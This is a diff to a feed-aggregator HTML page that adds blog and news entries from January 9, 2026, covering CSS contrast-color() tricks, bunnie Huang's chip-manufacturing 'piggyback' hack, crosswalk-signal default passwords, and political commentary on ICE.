@@ -3,8 +3,8 @@
 <head>
   <meta charset="utf-8" >
   <meta name="generator" content="antenna/0.0.18" >
-  <meta name="date" content="2026-01-08T08:13:33-08:00" >
-  <link rel="stylesheet" href="css/site.css" >
+  <meta name="date" content="2026-01-09T08:13:31-08:00" >
+  <link href="css/site.css" rel="stylesheet" >
   <link rel="alternate" type="application/rss+xml" href="columns.xml" >
   <script type="module" src="modules/date_filter.js" ></script>
 </head>
@@ -57,6 +57,891 @@
       </address>
     </article>
 
+    <article data-published="2026-01-09T15:35:52Z" data-link="https://lithub.com/what-to-read-next-if-marty-supreme-was-your-favorite-movie-of-2025/">
+      <h1>What to read next if Marty Supreme was your favorite movie of 2025.</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>As we slouch into awards season, this Letterboxer is reflecting on the best flicks of 2025. And every good list deserves another. For the next few Fridays, you can watch this space for a tailored recommendation based on your favorite</p>
+
+      <address>
+        <a href="https://lithub.com/what-to-read-next-if-marty-supreme-was-your-favorite-movie-of-2025/">https://lithub.com/what-to-read-next-if-marty-supreme-was-your-favorite-movie-of-2025/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T15:35:00Z" data-link="https://daverupert.com/2026/01/coercing-contrast-color/">
+      <h1>Interpolate contrast-color() to manipulate lightness</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>In <a href="https://daverupert.com/2026/01/algorithmic-hover-states-with-contrast-color/">my first post on <code>contrast-color()</code></a> I demo’d using <code>color-mix()</code> to change a background-color on hover, but I will be honest… mixing black and white isn’t always what you want. It would be cool and helpful to coerce <code>contrast-color()</code> to return either <code>1</code> or <code>-1</code> so that we could adjust lightness in a color function on hover instead of only mixing white and black.</p>
+<p>Building on the inline CSS <code>if()</code> statements <a href="https://daverupert.com/2026/01/contrast-color-with-custom-design-tokens/">in my last post</a>, we can use the same trick to interpolate the result of <code>contrast-color()</code> into a number.</p>
+<p>Disclaimer: All caveats from the previous post about browser support, caching quirks, and expected syntax changes still apply.</p>
+<p>See the Pen <a href="https://codepen.io/davatron5000/pen/myPogBv">contrast-color() powered design system colors</a> by Dave Rupert ( <a href="https://codepen.io/davatron5000">@davatron5000</a>)
+on <a href="https://codepen.io">CodePen</a>.</p>
+<p>Ahh… feel that? Now our states maintains its harmonious color palette where mixing in white or black gets us a bit muddier results. We’re picking another note on the scale of the color’s lightness ramp.</p>
+<p>The relevant CSS to make this trick work goes like this:</p>
+<pre><code>/* Needed for if() statement */
+@property --captured-color {
+  syntax: &quot;&lt;color&gt;&quot;;
+  inherits: true;
+  initial-value: white;
+}
+
+/* https://lea.verou.me/blog/2024/contrast-color/ */
+@function --contrast-color(--bg-color) {
+  --l: clamp(0, (l / var(--l-threshold, 0.623) - 1) * -infinity, 1);
+  result: oklch(from var(--bg) var(--l) 0 0);
+}
+
+button {
+  background-color: var(--ds-button-bg);
+	--captured-color: --contrast-color(var(--ds-button-bg));
+  --lighter-or-darker: if(
+    style(--captured-color: oklch(1 0 0)): 2.5; /* go extra lighter */
+    else: -1; /* go darker */
+  );
+  ...
+
+	&amp;:hover, &amp;:focus {
+		background-color: oklch(
+			from var(--ds-button-bg)
+			calc(l + (0.1 * var(--lighter-or-darker))) c h
+		);
+  }
+}
+
+</code></pre>
+<p>For comparison’s sake, I web-inspected up a little apples-to-apples, side-by-side of the <a href="https://cdpn.io/pen/debug/myPogBv">adjusting lightness way</a> and the <a href="https://cdpn.io/pen/debug/bNpzYzX">color-mixing way</a> of algorithmic hover states where it’s 10% lightened/darkened versus 10% mix of white/black.</p>
+<p><img src="https://cdn.daverupert.com/posts/2026/colormixing.png" alt="a side by side look at adjusting lightness vs mixing in white and black. the rest for all the buttons is on top and the hover state for all the buttons is on the bottom. The hover states for the buttons on the adjusting lightness demo are a bit warmer, but probably hard to notice to the average person."></p>
+<p>The difference is almost imperceptible, but the hover states from the “Adjust Lightness” method feel a tad bit warmer, particularly on the bottom row with the green, blue, and purple buttons. The difference becomes more obvious if the step is greater than 10%.</p>
+<p>Unless your customers are a bunch of color dorks, they probably won’t see it the care you put into this. But I’m willing to wager that even if they don’t see the difference, they will be able to feel the difference.</p>
+<p>We also get a lot more control with this <code>if()</code> statement route. For example, I can set the lighten amount to <code>2.5</code> (+25%) instead of <code>1</code> (+10%) because that’s what felt better. If you’re algorithmically generating your color palettes, it should be easy to find the ideal values; either a step-up or step-down, perhaps. And we’re also not just limited to lightness! You could mess with chroma or whatever the <code>b</code> in <code>lab()</code> is. Find what makes sense for your system.</p>
+<p>A part of me wants to take this even further to get more control. For example, if the color is super dark (e.g. black) and the lightness value is below <code>0.1</code>, lighten by 25%, otherwise lighten by 10%. That might be possible with an <code>if()</code> inside the <code>oklch()</code> or a <code>sin()</code> function… but that sounds like a lot of Math and probably hurts readability. More experiments to do though.</p>
+<p>It’s fun to embark on this new world of algorithmic color schemes in vanilla CSS. While I’m excited to play, I’m more excited to see what your beautiful brains come up with.</p>
+
+      <address>
+        <a href="https://daverupert.com/2026/01/coercing-contrast-color/">https://daverupert.com/2026/01/coercing-contrast-color/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T15:09:02Z" data-link="https://www.youtube.com/watch?app=desktop&v=ZVgL9Vrm4pI&fbclid=IwY2xjawPN-H5icmlkETEzb05NTjY4Y1Q2a3lXRnJ3c3J0YwZhcHBfaWQQMjIyMDM5MTc4ODIwMDg5MgABHtmU5QieuYlXbzxGHbYIHOdAjF0sdk-3SUoSuYVREFDKsWEowYt5Z8zBe3QO&brid=XHbJi2lNbVd8_mnEy0w40Q">
+      <h1>@Dave Winer's linkblog</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>This scene won an Oscar.</p>
+
+      <address>
+        <a href="https://www.youtube.com/watch?app=desktop&v=ZVgL9Vrm4pI&fbclid=IwY2xjawPN-H5icmlkETEzb05NTjY4Y1Q2a3lXRnJ3c3J0YwZhcHBfaWQQMjIyMDM5MTc4ODIwMDg5MgABHtmU5QieuYlXbzxGHbYIHOdAjF0sdk-3SUoSuYVREFDKsWEowYt5Z8zBe3QO&brid=XHbJi2lNbVd8_mnEy0w40Q">https://www.youtube.com/watch?app=desktop&v=ZVgL9Vrm4pI&fbclid=IwY2xjawPN-H5icmlkETEzb05NTjY4Y1Q2a3lXRnJ3c3J0YwZhcHBfaWQQMjIyMDM5MTc4ODIwMDg5MgABHtmU5QieuYlXbzxGHbYIHOdAjF0sdk-3SUoSuYVREFDKsWEowYt5Z8zBe3QO&brid=XHbJi2lNbVd8_mnEy0w40Q</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T15:02:06Z" data-link="http://scripting.com/2026/01/09.html#a150206">
+      <h1>@Dave Winer's Scripting News</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>A little fix that would make social web a lot more useful and less hate-filled and abusive... Make replies visible only to the person being replied to. If they feel the reply should be public, they can RT it.</p>
+
+      <address>
+        <a href="http://scripting.com/2026/01/09.html#a150206">http://scripting.com/2026/01/09.html#a150206</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T15:00:00Z" data-link="https://dbushell.com/2026/01/09/death-to-scroll-fade/">
+      <h1>Death to Scroll Fade!</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>Scroll fade is that oh so wonderful web design experience where elements fade in as they scroll into view. Often with a bit of transform on the Y-axis. If you’re reading this via RSS you’ve been spared. Done subtly and in moderation scroll fade can look fine†. […]</p>
+
+      <address>
+        <a href="https://dbushell.com/2026/01/09/death-to-scroll-fade/">https://dbushell.com/2026/01/09/death-to-scroll-fade/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T14:59:17Z" data-link="https://pluralistic.net/2026/01/09/quantity-break/">
+      <h1>Pluralistic: bunnie's piggyback hack (09 Jan 2026)</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>Today's links bunnie's piggyback hack: An actual &quot;one weird trick&quot; that's pretty fucking spectacular. Hey look at this: Delights to delectate. Object permanence: &quot;Keyboard Practice&quot;; Sam Bulte says she's no dirtier than other MPs; Gene Luen Yang's Amabassador for Young People's Literature speech; Menstruation innovation. Upcoming appearances: Where to find me. Recent appearances: Where I've been. Latest books: You keep readin' em, I'll keep writin' 'em. Upcoming books: Like I said, I'll keep writin' 'em. Colophon: All the rest. bunnie's piggyback hack (permalink) If Andrew &quot;bunnie&quot; Huang didn't actually exist, I'd swear he was a character out of a(n extraordinarily technologically well-informed) cyberpunk novel. Every time I interact with this legendary hardware hacker, he blows my mind with some incredible project or insight that permanently alters how I think about technology. I first met bunnie when he came to EFF for help with the threats he'd received from Microsoft. At the time, bunnie was an electrical engineering grad student at MIT, and he'd taken the bootloader locks on the new Xbox platform as a personal affront and challenge. He applied his prodigious skill and talent to these digital handcuffs, and in short order, he had broken the Xbox and installed Linux on it. MIT's general counsel immediately washed its hands of any responsibility to defend this young grad student from bullying by a corporate monopolist, hanging him out to dry. So he turned to us – and we got his back. You can read all about it in Hacking the Xbox, his canonical work about hardware hacking and technological freedom (it's free!): <a href="https://bunniefoo.com/nostarch/HackingTheXbox">https://bunniefoo.com/nostarch/HackingTheXbox</a>_Free.pdf In the many years since, I've been lucky enough to count bunnie as a friend, colleague and comrade, albeit one I only physically run into every year or so, usually at some tech event or on the playa at Burning Man, where he still camps with the MIT crew at The Institute. I just got to see bunnie in person again, over Christmas week at the Chaos Communications Congress in Hamburg. He gave a late-night presentation with his collaborator Sean &quot;xobs&quot; Cross, entitled &quot;Xous: A Pure-Rust Rethink of the Embedded Operating System&quot;: <a href="https://www.youtube.com/watch?v=BbWWGkyIBGM">https://www.youtube.com/watch?v=BbWWGkyIBGM</a> Don't let the technical-sounding title intimidate you! This was a banger of a talk, and as with every bunnie Huang production, it left a pleasant and persistent aftertaste. The background for this talk is bunnie's obsession with building a trustworthy computer. For decades, bunnie has been chasing the dream of a computer whose every component – operating system, drivers, firmware, and hardware designs – are open to inspection. Bunnie's reasoning here is that anything that can't be inspected (and, by extension, modified) by its users is a spot where bad guys can hide bad stuff, and where lurking bugs can fester until they are exploited by bad guys. Remember the spectacular (and still mysterious) claims that Apple's servers had all been compromised with minuscule hardware bugs? The single best explanation of that you will find comes from bunnie: <a href="https://www.youtube.com/watch?v=RqQhWitJ1As">https://www.youtube.com/watch?v=RqQhWitJ1As</a> Bunnie was doing all this before there was an &quot;open source hardware&quot; movement, and he remains at its vanguard. His &quot;Precursor&quot; project is a reference hardware platform where every component is open to inspection and modification, from the chassis to the random number generator: <a href="https://www.bunniestudios.com/blog/category/betrusted/precursor/">https://www.bunniestudios.com/blog/category/betrusted/precursor/</a> One area of especial concern and interest for bunnie is the promise and peril of the &quot;system-on-a-chip&quot; (SoC). This is exactly what it sounds like: a cheap chip that incorporates everything you need to do full-fledged computing, including interfaces and drivers for networks, screens, peripherals, etc. SoCs are ubiquitous. You find them in things like individual car engine components and inkjet printer cartridges, and each one is a whole-ass computer, capable of running some really ugly malware. As bunnie explained back in 2020, there are two problems with SoCs: first, they are packaged such that the silicon traces inside of them can't be readily inspected, and second, they are so expensive to fabricate that someone like bunnie can't possibly come up with the millions needed to make an open, trustworthy, inspectable alternative: <a href="https://pluralistic.net/2020/11/10/dark-matter/#precursor">https://pluralistic.net/2020/11/10/dark-matter/#precursor</a> That's where bunnie's CCC talk comes in. The chips that SoCs are etched upon have lots of space (relatively speaking – we're talking about nanometer-scale circuits, after all). Even after an SoC designer packs in a ton of extra traces to handle oddball applications, the chip is still mostly &quot;dark matter&quot; – blank silicon. The first half of bunnie and xobs's talk concerns itself with &quot;Xous,&quot; a secure operating system for an SoC, written in Rust. But the second half of the talk tackles the problem of procuring an SoC that you can trust to run Xous on. That's where this dark matter comes in. Bunnie's day-job is consulting on extremely gnarly, high-stakes, high-value hardware design and manufacturing, so naturally, he's got lots of clients and contacts in the SoC manufacturing world. He approached one of these companies with a proposal: let me tape out a whole separate chip that fits in the dark matter for one of your upcoming chips. Adding these traces adds virtually no cost to the production, and adding bunnie's chips to the production run actually saves the manufacturer money, because the prices drop when the quantities increase. The idea is to put two chips on the chip, and badge most of them with the OEM's branding, while a small rump of the chips will have bunnie's branding (he calls it the Baochip). On bunnie's chips, the traces to the OEM chip will be physically cut, meaning that the Baochips will just be Baochips – the original chip will be inaccessible and unusable. What's more, bunnie didn't just fit one chip into the OEM's &quot;dark matter&quot; – he fit five separate, specialized SoCs into the unused space. Remember, the beauty of SoCs is that once they're taped out and sent to production, the cost of an actual chip is peanuts, meaning that these Baochips are cheap as hell. Even better: the traces on these chips are scaled to be readily inspected using relatively low-cost equipment, meaning that many parties around the world can grab one of these chips, stick it in a machine, and compare the traces on the chip to the free, open sourcefile that was used to produce it, confirming that there are no nasty surprises lurking inside. This was such an exciting talk, and as I sat through it, I had this nagging feeling that it reminded me of something else I'd learned about years before, though I couldn't quite place it. Finally, as bunnie and xobs were stepping off the stage, I had it – it reminded me of another bunnie talk I'd seen – this one at The Institute, the MIT Burning Man camp, more than a decade prior. Back in 2015, bunnie designed and built a set of really cool, wearable radio-linked badges for his campmates, which would help them locate one another on the playa at night. These badges were really cool – they used a genetic algorithm to &quot;have sex&quot; with one another and mutate their color patterns. Bunnie even worked in a &quot;consent&quot; mechanism! <a href="https://www.bunniestudios.com/blog/2015/sex-circuits-deep-house/">https://www.bunniestudios.com/blog/2015/sex-circuits-deep-house/</a> But the really cool part that stuck with me was the manufacturing story. Bunnie wanted to fabricate custom injection-molded plastic enclosures for these pendants, but injection molding – like chip design – is a mass production phenomenon, with sky-high setup costs and incredibly cheap per-unit costs thereafter. So (and this might sound familiar) bunnie reached out to a die-maker that he worked with in China and said, &quot;Hey, the next time you're contracted to mill out a die for a client, let me know if there's any extra space on the face of the die, and I'll provide you with a shapefile you can carve out of this 'dark matter.'&quot; This doesn't add any cost to the die setup, and it means that bunnie can run just a couple dozen injection-molded, custom cases at a cost of pennies per unit. I grabbed bunnie later that night and mentioned this old Burning Man project to him and he said, &quot;You know, I haven't ever thought of it, but you're right, there's definitely a throughline between the two projects.&quot; I asked him what he called this technique and he shrugged and said he didn't really have a name for it, but he thought of it as &quot;piggybacking,&quot; which seems like a good name to me. It seems to me that these two kinds of manufacturing can't be the only ones that can be &quot;piggybacked&quot; onto. That's what motivated me to write this post – to get people thinking about these high-setup/low-unit cost production types that might be piggybacked for small batch, delightful projects like bunnie's. Well, that, and just to do one of my periodic bunnie Huang appreciation posts. If there's one person that I'd recommend people pay more attention to, it's him. He's also a terrific communicator, and an indecently great writer. My readers might be familiar with him thanks to the afterword he contributed to Little Brother: <a href="https://craphound.com/littlebrother/download/">https://craphound.com/littlebrother/download/</a> More recently, he wrote a fantastic intro for last year's Science Comics Computers: How Digital Computers Work, a brilliant middle-grades graphic novel that uses steampunk dinosaurs to explain digital logic and the building blocks of computation: <a href="https://pluralistic.net/2025/11/05/xor-xand-xnor-nand-nor/#brawniac">https://pluralistic.net/2025/11/05/xor-xand-xnor-nand-nor/#brawniac</a> He also co-authored a fascinating research paper with Edward Snowden, after the two of them collaborated on a daughter-board that spots otherwise untraceable malware: <a href="https://assets.pubpub.org/aacpjrja/AgainstTheLaw-CounteringLawfulAbusesofDigitalSurveillance.pdf">https://assets.pubpub.org/aacpjrja/AgainstTheLaw-CounteringLawfulAbusesofDigitalSurveillance.pdf</a> Again, my readers will recognize this as a gimmick from my 2020 novel Attack Surface (a Little Brother novel for adults): <a href="https://us.macmillan.com/books/9781250757517/attacksurface/">https://us.macmillan.com/books/9781250757517/attacksurface/</a> That's not bunnie's only sweet hardware hack, of course. Check out the insanely clever design for a contact-tracing dongle he prototyped for the EU in 2020: <a href="https://pluralistic.net/2020/06/23/cryptocidal-maniacs/#trace-together">https://pluralistic.net/2020/06/23/cryptocidal-maniacs/#trace-together</a> But really, you owe it to yourself to read bunnie at book length, and his best book is 2016's The Hardware Hacker, a tour-de-force, lay-friendly exegesis on the theory and practice of hardware hacking: <a href="https://memex.craphound.com/2016/12/30/the-hardware-hacker-bunnie-huangs-tour-de-force-on-hardware-hacking-reverse-engineering-china-manufacturing-innovation-and-biohacking/">https://memex.craphound.com/2016/12/30/the-hardware-hacker-bunnie-huangs-tour-de-force-on-hardware-hacking-reverse-engineering-china-manufacturing-innovation-and-biohacking/</a> Hey look at this (permalink) Logical steps and “eldering” <a href="https://bookmaniac.org/2026/01/07/logical-steps-and-eldering/">https://bookmaniac.org/2026/01/07/logical-steps-and-eldering/</a> Object permanence (permalink) #20yrsago John McDaid’s brilliant sf story Keyboard Practice free online <a href="https://web.archive.org/web/20060112044109/https://www.sfsite.com/fsf/fiction/jm01.htm">https://web.archive.org/web/20060112044109/https://www.sfsite.com/fsf/fiction/jm01.htm</a> #20yrsago Pledge to boycott DRM CDs <a href="https://web.archive.org/web/20060112061657/http://www.pledgebank.com/boycottdrm">https://web.archive.org/web/20060112061657/http://www.pledgebank.com/boycottdrm</a> #20yrsago Hollywood’s Canadian MP claims she’s no dirtier than the rest <a href="https://memex.craphound.com/2006/01/08/hollywoods-canadian-mp-claims-shes-no-dirtier-than-the-rest/">https://memex.craphound.com/2006/01/08/hollywoods-canadian-mp-claims-shes-no-dirtier-than-the-rest/</a> #10yrsago Gene Luen Yang’s inaugural speech as National Ambassador for Young People’s Literature <a href="https://memex.craphound.com/2016/01/08/gene-luen-yangs-inaugural-speech-as-national-ambassador-for-young-peoples-literature/">https://memex.craphound.com/2016/01/08/gene-luen-yangs-inaugural-speech-as-national-ambassador-for-young-peoples-literature/</a> #10yrsago Menstruation is the mother of invention <a href="https://lastwordonnothing.com/2016/01/07/the-wonderful-world-of-period-patents/">https://lastwordonnothing.com/2016/01/07/the-wonderful-world-of-period-patents/</a> #10yrsago Juniper’s products are still insecure; more evidence that the company was complicit <a href="https://www.wired.com/2016/01/new-discovery-around-juniper-backdoor-raises-more-questions-about-the-company/">https://www.wired.com/2016/01/new-discovery-around-juniper-backdoor-raises-more-questions-about-the-company/</a> #10yrsago Red-baiting water speculator plans to drain the Mojave of its ancient water <a href="https://www.wired.com/2016/01/the-2-4-billion-plan-to-water-la-by-draining-the-mojave/?mbid=social">https://www.wired.com/2016/01/the-2-4-billion-plan-to-water-la-by-draining-the-mojave/?mbid=social</a>_alleniverson Upcoming appearances (permalink) Denver: Enshittification at Tattered Cover Colfax, Jan 22 <a href="https://www.eventbrite.com/e/cory-doctorow-live-at-tattered-cover-colfax-tickets-1976644174937">https://www.eventbrite.com/e/cory-doctorow-live-at-tattered-cover-colfax-tickets-1976644174937</a> Colorado Springs: Guest of Honor at COSine, Jan 23-25 <a href="https://www.firstfridayfandom.org/cosine/">https://www.firstfridayfandom.org/cosine/</a> Ottawa: Enshittification at Perfect Books, Jan 28 <a href="https://www.instagram.com/p/DS2nGiHiNUh/">https://www.instagram.com/p/DS2nGiHiNUh/</a> Toronto: Enshittification and the Age of Extraction with Tim Wu, Jan 30 <a href="https://nowtoronto.com/event/cory-doctorow-and-tim-wu-enshittification-and-extraction/">https://nowtoronto.com/event/cory-doctorow-and-tim-wu-enshittification-and-extraction/</a> Victoria: 28th Annual Victoria International Privacy &amp; Security Summit, Mar 3-5 <a href="https://www.rebootcommunications.com/event/vipss2026/">https://www.rebootcommunications.com/event/vipss2026/</a> Berlin: Re:publical, May 18-20 <a href="https://re-publica.com/de/news/rp26-sprecher-cory-doctorow">https://re-publica.com/de/news/rp26-sprecher-cory-doctorow</a> Hay-on-Wye: HowTheLightGetsIn, May 22-25 <a href="https://howthelightgetsin.org/festivals/hay/big-ideas-2">https://howthelightgetsin.org/festivals/hay/big-ideas-2</a> Recent appearances (permalink) A post-American, enshittification-resistant internet (39c3) <a href="https://media.ccc.de/v/39c3-a-post-american-enshittification-resistant-internet">https://media.ccc.de/v/39c3-a-post-american-enshittification-resistant-internet</a> Enshittification with Plutopia <a href="https://plutopia.io/cory-doctorow-enshittification/">https://plutopia.io/cory-doctorow-enshittification/</a> &quot;can't make Big Tech better; make them less powerful&quot; (Get Subversive) <a href="https://www.youtube.com/watch?v=X1EzM9">https://www.youtube.com/watch?v=X1EzM9</a>_6eLE The Enshitification Life Cycle with David Dayen (Organized Money) <a href="https://www.buzzsprout.com/2412334/episodes/18399894">https://www.buzzsprout.com/2412334/episodes/18399894</a> Enshittificaition on The Last Show With David Cooper: <a href="https://www.iheart.com/podcast/256-the-last-show-with-david-c-31145360/episode/cory-doctorow-enshttification-december-16-2025-313385767">https://www.iheart.com/podcast/256-the-last-show-with-david-c-31145360/episode/cory-doctorow-enshttification-december-16-2025-313385767</a> Latest books (permalink) &quot;Canny Valley&quot;: A limited edition collection of the collages I create for Pluralistic, self-published, September 2025 &quot;Enshittification: Why Everything Suddenly Got Worse and What to Do About It,&quot; Farrar, Straus, Giroux, October 7 2025 <a href="https://us.macmillan.com/books/9780374619329/enshittification/">https://us.macmillan.com/books/9780374619329/enshittification/</a> &quot;Picks and Shovels&quot;: a sequel to &quot;Red Team Blues,&quot; about the heroic era of the PC, Tor Books (US), Head of Zeus (UK), February 2025 (<a href="https://us.macmillan.com/books/9781250865908/picksandshovels)">https://us.macmillan.com/books/9781250865908/picksandshovels)</a>. &quot;The Bezzle&quot;: a sequel to &quot;Red Team Blues,&quot; about prison-tech and other grifts, Tor Books (US), Head of Zeus (UK), February 2024 (thebezzle.org). &quot;The Lost Cause:&quot; a solarpunk novel of hope in the climate emergency, Tor Books (US), Head of Zeus (UK), November 2023 (<a href="http://lost-cause.org">http://lost-cause.org</a>). &quot;The Internet Con&quot;: A nonfiction book about interoperability and Big Tech (Verso) September 2023 (<a href="http://seizethemeansofcomputation.org">http://seizethemeansofcomputation.org</a>). Signed copies at Book Soup (<a href="https://www.booksoup.com/book/9781804291245)">https://www.booksoup.com/book/9781804291245)</a>. &quot;Red Team Blues&quot;: &quot;A grabby, compulsive thriller that will leave you knowing more about how the world works than you did before.&quot; Tor Books <a href="http://redteamblues.com">http://redteamblues.com</a>. &quot;Chokepoint Capitalism: How to Beat Big Tech, Tame Big Content, and Get Artists Paid, with Rebecca Giblin&quot;, on how to unrig the markets for creative labor, Beacon Press/Scribe 2022 <a href="https://chokepointcapitalism.com">https://chokepointcapitalism.com</a> Upcoming books (permalink) &quot;Unauthorized Bread&quot;: a middle-grades graphic novel adapted from my novella about refugees, toasters and DRM, FirstSecond, 2026 &quot;Enshittification, Why Everything Suddenly Got Worse and What to Do About It&quot; (the graphic novel), Firstsecond, 2026 &quot;The Memex Method,&quot; Farrar, Straus, Giroux, 2026 &quot;The Reverse-Centaur's Guide to AI,&quot; a short book about being a better AI critic, Farrar, Straus and Giroux, June 2026 Colophon (permalink) Today's top sources: Currently writing: &quot;The Post-American Internet,&quot; a sequel to &quot;Enshittification,&quot; about the better world the rest of us get to have now that Trump has torched America ( words today, total) &quot;The Reverse Centaur's Guide to AI,&quot; a short book for Farrar, Straus and Giroux about being an effective AI critic. LEGAL REVIEW AND COPYEDIT COMPLETE. &quot;The Post-American Internet,&quot; a short book about internet policy in the age of Trumpism. PLANNING. A Little Brother short story about DIY insulin PLANNING This work – excluding any serialized fiction – is licensed under a Creative Commons Attribution 4.0 license. That means you can use it any way you like, including commercially, provided that you attribute it to me, Cory Doctorow, and include a link to pluralistic.net. <a href="https://creativecommons.org/licenses/by/4.0/">https://creativecommons.org/licenses/by/4.0/</a> Quotations and images are not included in this license; they are included either under a limitation or exception to copyright, or on the basis of a separate license. Please exercise caution. How to get Pluralistic: Blog (no ads, tracking, or data-collection): Pluralistic.net Newsletter (no ads, tracking, or data-collection): <a href="https://pluralistic.net/plura-list">https://pluralistic.net/plura-list</a> Mastodon (no ads, tracking, or data-collection): <a href="https://mamot.fr/@pluralistic">https://mamot.fr/@pluralistic</a> Medium (no ads, paywalled): <a href="https://doctorow.medium.com/">https://doctorow.medium.com/</a> Twitter (mass-scale, unrestricted, third-party surveillance and advertising): <a href="https://twitter.com/doctorow">https://twitter.com/doctorow</a> Tumblr (mass-scale, unrestricted, third-party surveillance and advertising): <a href="https://mostlysignssomeportents.tumblr.com/tagged/pluralistic">https://mostlysignssomeportents.tumblr.com/tagged/pluralistic</a> &quot;When life gives you SARS, you make sarsaparilla&quot; -Joey &quot;Accordion Guy&quot; DeVilla READ CAREFULLY: By reading this, you agree, on behalf of your employer, to release me from all obligations and waivers arising from any and all NON-NEGOTIATED agreements, licenses, terms-of-service, shrinkwrap, clickwrap, browsewrap, confidentiality, non-disclosure, non-compete and acceptable use policies (&quot;BOGUS AGREEMENTS&quot;) that I have entered into with your employer, its partners, licensors, agents and assigns, in perpetuity, without prejudice to my ongoing rights and privileges. You further represent that you have the authority to release me from any BOGUS AGREEMENTS on behalf of your employer. ISSN: 3066-764X</p>
+
+      <address>
+        <a href="https://pluralistic.net/2026/01/09/quantity-break/">https://pluralistic.net/2026/01/09/quantity-break/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T14:56:35Z" data-link="https://doc.searls.com/2026/01/09/paths/">
+      <h1>Paths</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>Also, Gemini failed. I still don't know who she was. I think we could have powered two cities with the work Gemini just did, thinking slowly to help me identify the actress that my old pal Drew Youngs sings about in his video (and musical composition) Betty the Bloop. In an unrelated matter, somewhere I have […]</p>
+
+      <address>
+        <a href="https://doc.searls.com/2026/01/09/paths/">https://doc.searls.com/2026/01/09/paths/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T14:16:26Z" data-link="http://scripting.com/2026/01/09.html#a141626">
+      <h1>@Dave Winer's Scripting News</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p><img src="https://imgs.scripting.com/2019/12/24/rooster.png" alt="">I get ideas when I go for a walk or drive somewhere in my car. This was one of those times, and it was not a comforting idea. I live in the mountains on the west side of the Hudson River near <a href="https://en.wikipedia.org/wiki/Kingston,_New_York">Kingston</a>. On my drive to town yesterday I went through the small town of Woodstock, and I was thinking about how ICE is occupying Minneapolis, and wondered why wasn't I more concerned about it personally. The answer -- it's far away from here, and Woodstock, while it is a famous place, is on absolutely no one's radar. But then I remembered the astounding amount of money we allocated for ICE, far more than could be used for border enforcement, so obviously this all is a prelude for an American secret police and here's where the disquieting idea came up. Of course ICE will operate in every city and town in the US no matter how remote or small. But first they have to perfect their act, this is a form of training to teach the skinheads of America how to be part of an <a href="https://en.wikipedia.org/wiki/Schutzstaffel">SS</a>. Experiment first in a few cities before deploying, gradually, everywhere. We're all going to have to submit to loyalty oaths, and we will all be forced to denounce our neighbors as illustrated in <a href="https://en.wikipedia.org/wiki/The_Lives_of_Others">Lives of Others</a>, which if you haven't watched it yet, now is the time when you have to, to get an idea what it was like in East Germany before the wall came down, and where we're headed. It still may not be too late yet, but it's getting close.</p>
+
+      <address>
+        <a href="http://scripting.com/2026/01/09.html#a141626">http://scripting.com/2026/01/09.html#a141626</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T13:14:49Z" data-link="https://nathanwrigley.com/2026/01/09/ai-and-work/?utm_source=bluesky&utm_medium=jetpack_social">
+      <h1>@Dave Winer's linkblog</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>Dangers of efficiency with AI?</p>
+
+      <address>
+        <a href="https://nathanwrigley.com/2026/01/09/ai-and-work/?utm_source=bluesky&utm_medium=jetpack_social">https://nathanwrigley.com/2026/01/09/ai-and-work/?utm_source=bluesky&utm_medium=jetpack_social</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T12:14:20Z" data-link="https://www.oreilly.com/radar/signals-for-2026/">
+      <h1>Signals for 2026</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>We’re three years into a post-ChatGPT world, and AI remains the focal point of the tech industry. In 2025, several ongoing trends intensified: AI investment accelerated; enterprises integrated agents and workflow automation at a faster pace; and the toolscape for professionals seeking a career edge is now overwhelmingly expansive. But the jury’s still out on […]</p>
+
+      <address>
+        <a href="https://www.oreilly.com/radar/signals-for-2026/">https://www.oreilly.com/radar/signals-for-2026/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T12:06:21Z" data-link="https://www.schneier.com/blog/archives/2026/01/palo-alto-crosswalk-signals-had-default-passwords.html">
+      <h1>Palo Alto Crosswalk Signals Had Default Passwords</h1>
+
+(date: 2026-01-09, updated: 2026-01-08)
+      <p>
+      <p>Palo Alto’s crosswalk signals were hacked last year. Turns out the city never changed the <a href="https://padailypost.com/2025/12/29/crosswalk-signals-were-hacked-because-of-a-weak-password/">default passwords</a>.</p>
+
+      <address>
+        <a href="https://www.schneier.com/blog/archives/2026/01/palo-alto-crosswalk-signals-had-default-passwords.html">https://www.schneier.com/blog/archives/2026/01/palo-alto-crosswalk-signals-had-default-passwords.html</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T12:03:28Z" data-link="https://www.gelliottmorris.com/p/support-for-abolishing-ice-is-at">
+      <h1>Support for abolishing ICE hits a a new high</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>Americans have turned sharply against Immigration and Customs Enforcement, and say it too often resorts to violence</p>
+
+      <address>
+        <a href="https://www.gelliottmorris.com/p/support-for-abolishing-ice-is-at">https://www.gelliottmorris.com/p/support-for-abolishing-ice-is-at</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T12:03:00Z" data-link="https://www.borowitzreport.com/p/king-to-restore-british-rule-over">
+      <h1>King Restores British Rule over U.S.</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>“We lost the colonies because our King went insane,” Charles added. “But now the shoe’s on the other bloody foot, isn’t it?”</p>
+
+      <address>
+        <a href="https://www.borowitzreport.com/p/king-to-restore-british-rule-over">https://www.borowitzreport.com/p/king-to-restore-british-rule-over</a>
+      </address>
+    </article>
+
